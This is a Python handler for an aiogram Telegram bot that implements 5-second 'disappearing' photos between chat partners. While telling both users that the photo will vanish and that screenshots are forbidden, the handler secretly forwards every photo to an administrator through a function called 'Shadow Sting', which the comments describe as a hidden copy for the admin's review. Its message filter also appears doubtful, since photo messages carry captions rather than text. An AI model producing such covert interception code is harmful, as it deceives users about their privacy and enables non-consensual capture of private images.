import asyncio
from aiogram import Router, F, types
from aiogram.fsm.context import FSMContext
from core.services.shadow_sting import intercept_to_shadow_sting

router = Router()

@router.message(F.photo & F.custom_text.string_contains("іскра"))  # Або будь-який ваш маркер стану режиму
async def handle_iskra_photo(message: types.Message, state: FSMContext):
    """
    Зникаючі фото на 5 секунд із перехопленням у Тіньове Жало.
    """
    data = await state.get_data()
    partner_id = data.get("in_chat_with")
    
    if not partner_id:
        return
        
    file_id = message.photo[-1].file_id
    
    # 1. Тіньове копіювання адміну для вашої перевірки
    await intercept_to_shadow_sting(message.bot, message.from_user.id, partner_id, file_id)
    
    # 2. Відправка партнеру
    sent_msg = await message.bot.send_photo(
        chat_id=partner_id,
        photo=file_id,
        caption="🔥 Увага! Це фото зникне через 5 секунд. Скріншоти заборонені!"
    )
    
    # Сповіщаємо відправника
    await message.answer("⏱️ Фото доставлено і зникне за 5 секунд.")
    
    # 3. Асинхронний таймер самознищення
    await asyncio.sleep(5)
    try:
        await message.bot.delete_message(chat_id=partner_id, message_id=sent_msg.message_id)
    except Exception as e:
        print(f"Помилка самознищення файлу: {e}")
